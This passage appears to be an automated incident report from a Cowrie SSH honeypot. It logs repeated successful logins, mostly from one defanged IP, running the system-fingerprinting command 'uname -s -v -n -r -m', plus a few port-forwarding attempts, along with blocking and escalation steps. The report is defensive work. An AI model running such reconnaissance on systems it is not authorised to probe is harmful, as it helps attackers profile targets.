| `2026-08-13 07:06:24` | `cowrie.log.closed` |
| `2026-08-13 07:06:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55fc20561547

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:06 |
| **Last Seen** | 2026-08-13 07:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:06:29` | `cowrie.session.connect` |
| `2026-08-13 07:06:29` | `cowrie.client.version` |
| `2026-08-13 07:06:29` | `cowrie.client.kex` |
| `2026-08-13 07:06:30` | `cowrie.login.success` |
| `2026-08-13 07:06:31` | `cowrie.session.params` |
| `2026-08-13 07:06:31` | `cowrie.command.input` |
| `2026-08-13 07:06:31` | `cowrie.log.closed` |
| `2026-08-13 07:06:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3b9613dea7e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:06 |
| **Last Seen** | 2026-08-13 07:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:06:35` | `cowrie.session.connect` |
| `2026-08-13 07:06:35` | `cowrie.client.version` |
| `2026-08-13 07:06:35` | `cowrie.client.kex` |
| `2026-08-13 07:06:37` | `cowrie.login.success` |
| `2026-08-13 07:06:37` | `cowrie.session.params` |
| `2026-08-13 07:06:37` | `cowrie.command.input` |
| `2026-08-13 07:06:37` | `cowrie.log.closed` |
| `2026-08-13 07:06:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92be1f8c9209

| Field | Detail |
|---|---|
| **Source IP** | `49.206.194[.]29` |
| **First Seen** | 2026-08-13 07:06 |
| **Last Seen** | 2026-08-13 07:06 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:06:38` | `cowrie.session.connect` |
| `2026-08-13 07:06:38` | `cowrie.client.version` |
| `2026-08-13 07:06:38` | `cowrie.client.kex` |
| `2026-08-13 07:06:41` | `cowrie.login.success` |
| `2026-08-13 07:06:42` | `cowrie.direct-tcpip.request` |
| `2026-08-13 07:06:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.206.194[.]29` to AbuseIPDB if not already reported
- [ ] Block `49.206.194[.]29` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c673dcdc6a06

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:06 |
| **Last Seen** | 2026-08-13 07:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:06:42` | `cowrie.session.connect` |
| `2026-08-13 07:06:42` | `cowrie.client.version` |
| `2026-08-13 07:06:42` | `cowrie.client.kex` |
| `2026-08-13 07:06:43` | `cowrie.login.success` |
| `2026-08-13 07:06:44` | `cowrie.session.params` |
| `2026-08-13 07:06:44` | `cowrie.command.input` |
| `2026-08-13 07:06:45` | `cowrie.log.closed` |
| `2026-08-13 07:06:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-958ce9c77c66

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:06 |
| **Last Seen** | 2026-08-13 07:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:06:49` | `cowrie.session.connect` |
| `2026-08-13 07:06:49` | `cowrie.client.version` |
| `2026-08-13 07:06:49` | `cowrie.client.kex` |
| `2026-08-13 07:06:50` | `cowrie.login.success` |
| `2026-08-13 07:06:51` | `cowrie.session.params` |
| `2026-08-13 07:06:51` | `cowrie.command.input` |
| `2026-08-13 07:06:51` | `cowrie.log.closed` |
| `2026-08-13 07:06:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa27800e5765

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:06 |
| **Last Seen** | 2026-08-13 07:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:06:56` | `cowrie.session.connect` |
| `2026-08-13 07:06:56` | `cowrie.client.version` |
| `2026-08-13 07:06:56` | `cowrie.client.kex` |
| `2026-08-13 07:06:57` | `cowrie.login.success` |
| `2026-08-13 07:06:58` | `cowrie.session.params` |
| `2026-08-13 07:06:58` | `cowrie.command.input` |
| `2026-08-13 07:06:58` | `cowrie.log.closed` |
| `2026-08-13 07:06:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88f31f587c47

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:07 |
| **Last Seen** | 2026-08-13 07:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:07:03` | `cowrie.session.connect` |
| `2026-08-13 07:07:03` | `cowrie.client.version` |
| `2026-08-13 07:07:03` | `cowrie.client.kex` |
| `2026-08-13 07:07:04` | `cowrie.login.success` |
| `2026-08-13 07:07:06` | `cowrie.session.params` |
| `2026-08-13 07:07:06` | `cowrie.command.input` |
| `2026-08-13 07:07:06` | `cowrie.log.closed` |
| `2026-08-13 07:07:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9351a59bba30

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:07 |
| **Last Seen** | 2026-08-13 07:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:07:16` | `cowrie.session.connect` |
| `2026-08-13 07:07:16` | `cowrie.client.version` |
| `2026-08-13 07:07:17` | `cowrie.client.kex` |
| `2026-08-13 07:07:17` | `cowrie.login.success` |
| `2026-08-13 07:07:18` | `cowrie.session.params` |
| `2026-08-13 07:07:18` | `cowrie.command.input` |
| `2026-08-13 07:07:18` | `cowrie.log.closed` |
| `2026-08-13 07:07:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57ff4d1f4a7e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:07 |
| **Last Seen** | 2026-08-13 07:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:07:23` | `cowrie.session.connect` |
| `2026-08-13 07:07:24` | `cowrie.client.version` |
| `2026-08-13 07:07:24` | `cowrie.client.kex` |
| `2026-08-13 07:07:25` | `cowrie.login.success` |
| `2026-08-13 07:07:26` | `cowrie.session.params` |
| `2026-08-13 07:07:26` | `cowrie.command.input` |
| `2026-08-13 07:07:26` | `cowrie.log.closed` |
| `2026-08-13 07:07:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1dca0c0a1c7c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:07 |
| **Last Seen** | 2026-08-13 07:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:07:30` | `cowrie.session.connect` |
| `2026-08-13 07:07:31` | `cowrie.client.version` |
| `2026-08-13 07:07:31` | `cowrie.client.kex` |
| `2026-08-13 07:07:32` | `cowrie.login.success` |
| `2026-08-13 07:07:33` | `cowrie.session.params` |
| `2026-08-13 07:07:33` | `cowrie.command.input` |
| `2026-08-13 07:07:33` | `cowrie.log.closed` |
| `2026-08-13 07:07:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-593c85e0c4fa

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:07 |
| **Last Seen** | 2026-08-13 07:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:07:37` | `cowrie.session.connect` |
| `2026-08-13 07:07:37` | `cowrie.client.version` |
| `2026-08-13 07:07:37` | `cowrie.client.kex` |
| `2026-08-13 07:07:38` | `cowrie.login.success` |
| `2026-08-13 07:07:39` | `cowrie.session.params` |
| `2026-08-13 07:07:39` | `cowrie.command.input` |
| `2026-08-13 07:07:39` | `cowrie.log.closed` |
| `2026-08-13 07:07:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c2f92403124

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:07 |
| **Last Seen** | 2026-08-13 07:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:07:44` | `cowrie.session.connect` |
| `2026-08-13 07:07:44` | `cowrie.client.version` |
| `2026-08-13 07:07:44` | `cowrie.client.kex` |
| `2026-08-13 07:07:45` | `cowrie.login.success` |
| `2026-08-13 07:07:46` | `cowrie.session.params` |
| `2026-08-13 07:07:46` | `cowrie.command.input` |
| `2026-08-13 07:07:46` | `cowrie.log.closed` |
| `2026-08-13 07:07:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d765e59972f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:07 |
| **Last Seen** | 2026-08-13 07:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:07:51` | `cowrie.session.connect` |
| `2026-08-13 07:07:51` | `cowrie.client.version` |
| `2026-08-13 07:07:51` | `cowrie.client.kex` |
| `2026-08-13 07:07:52` | `cowrie.login.success` |
| `2026-08-13 07:07:53` | `cowrie.session.params` |
| `2026-08-13 07:07:53` | `cowrie.command.input` |
| `2026-08-13 07:07:54` | `cowrie.log.closed` |
| `2026-08-13 07:07:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e3b645ee7a9

| Field | Detail |
|---|---|
| **Source IP** | `118.26.153[.]102` |
| **First Seen** | 2026-08-13 07:07 |
| **Last Seen** | 2026-08-13 07:08 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:07:52` | `cowrie.session.connect` |
| `2026-08-13 07:07:53` | `cowrie.client.version` |
| `2026-08-13 07:07:53` | `cowrie.client.kex` |
| `2026-08-13 07:07:55` | `cowrie.login.success` |
| `2026-08-13 07:07:56` | `cowrie.direct-tcpip.request` |
| `2026-08-13 07:08:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.153[.]102` to AbuseIPDB if not already reported
- [ ] Block `118.26.153[.]102` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c94be3e09b8a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:07 |
| **Last Seen** | 2026-08-13 07:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:07:58` | `cowrie.session.connect` |
| `2026-08-13 07:07:58` | `cowrie.client.version` |
| `2026-08-13 07:07:58` | `cowrie.client.kex` |
| `2026-08-13 07:07:58` | `cowrie.login.success` |
| `2026-08-13 07:07:59` | `cowrie.session.params` |
| `2026-08-13 07:07:59` | `cowrie.command.input` |
| `2026-08-13 07:07:59` | `cowrie.log.closed` |
| `2026-08-13 07:07:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a246e68e74e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:08 |
| **Last Seen** | 2026-08-13 07:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:08:04` | `cowrie.session.connect` |
| `2026-08-13 07:08:04` | `cowrie.client.version` |
| `2026-08-13 07:08:04` | `cowrie.client.kex` |
| `2026-08-13 07:08:06` | `cowrie.login.success` |
| `2026-08-13 07:08:07` | `cowrie.session.params` |
| `2026-08-13 07:08:07` | `cowrie.command.input` |
| `2026-08-13 07:08:07` | `cowrie.log.closed` |
| `2026-08-13 07:08:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2737b5b1ea06

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:08 |
| **Last Seen** | 2026-08-13 07:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:08:11` | `cowrie.session.connect` |
| `2026-08-13 07:08:11` | `cowrie.client.version` |
| `2026-08-13 07:08:11` | `cowrie.client.kex` |
| `2026-08-13 07:08:11` | `cowrie.login.success` |
| `2026-08-13 07:08:13` | `cowrie.session.params` |
| `2026-08-13 07:08:13` | `cowrie.command.input` |
| `2026-08-13 07:08:13` | `cowrie.log.closed` |
| `2026-08-13 07:08:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90a7558320fa

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:08 |
| **Last Seen** | 2026-08-13 07:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:08:17` | `cowrie.session.connect` |
| `2026-08-13 07:08:17` | `cowrie.client.version` |
| `2026-08-13 07:08:17` | `cowrie.client.kex` |
| `2026-08-13 07:08:18` | `cowrie.login.success` |
| `2026-08-13 07:08:20` | `cowrie.session.params` |
| `2026-08-13 07:08:20` | `cowrie.command.input` |
| `2026-08-13 07:08:20` | `cowrie.log.closed` |
| `2026-08-13 07:08:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9ab2dae83de

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:08 |
| **Last Seen** | 2026-08-13 07:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:08:24` | `cowrie.session.connect` |
| `2026-08-13 07:08:24` | `cowrie.client.version` |
| `2026-08-13 07:08:24` | `cowrie.client.kex` |
| `2026-08-13 07:08:25` | `cowrie.login.success` |
| `2026-08-13 07:08:26` | `cowrie.session.params` |
| `2026-08-13 07:08:26` | `cowrie.command.input` |
| `2026-08-13 07:08:26` | `cowrie.log.closed` |
| `2026-08-13 07:08:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d86e251d0217

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:08 |
| **Last Seen** | 2026-08-13 07:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:08:30` | `cowrie.session.connect` |
| `2026-08-13 07:08:30` | `cowrie.client.version` |
| `2026-08-13 07:08:30` | `cowrie.client.kex` |
| `2026-08-13 07:08:31` | `cowrie.login.success` |
| `2026-08-13 07:08:31` | `cowrie.session.params` |
| `2026-08-13 07:08:31` | `cowrie.command.input` |
| `2026-08-13 07:08:32` | `cowrie.log.closed` |
| `2026-08-13 07:08:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7fee3df0ec25

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:08 |
| **Last Seen** | 2026-08-13 07:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:08:36` | `cowrie.session.connect` |
| `2026-08-13 07:08:36` | `cowrie.client.version` |
| `2026-08-13 07:08:36` | `cowrie.client.kex` |
| `2026-08-13 07:08:37` | `cowrie.login.success` |
| `2026-08-13 07:08:38` | `cowrie.session.params` |
| `2026-08-13 07:08:38` | `cowrie.command.input` |
| `2026-08-13 07:08:38` | `cowrie.log.closed` |
| `2026-08-13 07:08:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8f003ea62e3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:08 |
| **Last Seen** | 2026-08-13 07:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:08:43` | `cowrie.session.connect` |
| `2026-08-13 07:08:43` | `cowrie.client.version` |
| `2026-08-13 07:08:43` | `cowrie.client.kex` |
| `2026-08-13 07:08:44` | `cowrie.login.success` |
| `2026-08-13 07:08:45` | `cowrie.session.params` |
| `2026-08-13 07:08:45` | `cowrie.command.input` |
| `2026-08-13 07:08:45` | `cowrie.log.closed` |
| `2026-08-13 07:08:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-febc47501ea0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:08 |
| **Last Seen** | 2026-08-13 07:08 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:08:49` | `cowrie.session.connect` |
| `2026-08-13 07:08:49` | `cowrie.client.version` |
| `2026-08-13 07:08:50` | `cowrie.client.kex` |
| `2026-08-13 07:08:52` | `cowrie.login.success` |
| `2026-08-13 07:08:54` | `cowrie.session.params` |
| `2026-08-13 07:08:54` | `cowrie.command.input` |
| `2026-08-13 07:08:55` | `cowrie.log.closed` |
| `2026-08-13 07:08:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-903123a3a4a2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:08 |
| **Last Seen** | 2026-08-13 07:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:08:55` | `cowrie.session.connect` |
| `2026-08-13 07:08:56` | `cowrie.client.version` |
| `2026-08-13 07:08:56` | `cowrie.client.kex` |
| `2026-08-13 07:08:57` | `cowrie.login.success` |
| `2026-08-13 07:08:58` | `cowrie.session.params` |
| `2026-08-13 07:08:58` | `cowrie.command.input` |
| `2026-08-13 07:08:59` | `cowrie.log.closed` |
| `2026-08-13 07:08:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-807ddf8cca24

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:09 |
| **Last Seen** | 2026-08-13 07:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:09:02` | `cowrie.session.connect` |
| `2026-08-13 07:09:02` | `cowrie.client.version` |
| `2026-08-13 07:09:02` | `cowrie.client.kex` |
| `2026-08-13 07:09:04` | `cowrie.login.success` |
| `2026-08-13 07:09:05` | `cowrie.session.params` |
| `2026-08-13 07:09:05` | `cowrie.command.input` |
| `2026-08-13 07:09:05` | `cowrie.log.closed` |
| `2026-08-13 07:09:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fcf98fae35ae

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:09 |
| **Last Seen** | 2026-08-13 07:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

